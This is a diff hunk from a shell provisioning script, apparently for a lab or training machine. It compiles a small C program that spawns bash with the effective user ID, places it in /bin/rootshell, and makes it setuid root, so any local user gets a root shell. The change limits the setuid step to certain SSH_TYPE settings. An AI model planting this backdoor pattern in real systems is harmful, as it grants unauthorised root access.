@@ -151,7 +151,11 @@ echo '#include<unistd.h>' >> /bin/rootshell/asroot.c
 echo '#include<sys/types.h>' >> /bin/rootshell/asroot.c
 echo 'int main(){setuid(geteuid());system("/bin/bash");return 0;}' >> /bin/rootshell/asroot.c
 cd /bin/rootshell && gcc asroot.c -o myShell
-chmod u+s /bin/rootshell/myShell 
+
+if [ $SSH_TYPE -ne 1 ]; then
+  chmod u+s /bin/rootshell/myShell 
+fi
+
 chown -R ot-admin:admin /home/ot-admin
 
 
